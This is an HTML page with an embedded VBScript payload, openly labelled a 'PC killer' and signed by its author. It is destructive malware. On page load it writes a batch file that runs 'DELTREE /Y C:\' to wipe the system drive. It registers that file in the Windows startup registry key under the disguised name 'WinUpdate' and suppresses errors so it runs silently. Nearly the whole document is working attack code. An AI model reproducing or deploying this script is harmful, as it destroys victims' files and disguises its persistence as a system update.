<html><head><title>Simple and fast PC killer BY:N0:7</title></head><body bgcolor="Black">
<Script Language="VBScript"><!--
'Simple and fast PC killer by sevenC [N0:7]
'This only fun
On error resume next
Set B0123 = createobject("scripting.filesystemobject")
C0123 = B0123.getspecialfolder(0)
D0123 = C0123 & "\executor.bat"
set drop = B0123.createtextfile(D0123)
drop.writeline "echo off"
drop.writeline "DELTREE /Y C:\"
drop.close
Set E0123 = createobject("wscript.shell")
E0123.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate",D0123
B0123.copyfile wscript.scriptfullname, D0123
--></script></body</html>
<h3 align ="center"><font color="white">....N0:7.....<br>SIMPLE AND FAST PC
KILLER<br>&nbsp;by sevenC [N0:7]<br><br>N0 WAR ANYMORE<br><br>.....Don't forget me.....<br>http://trax.to/sevenC</h></font></body</html>"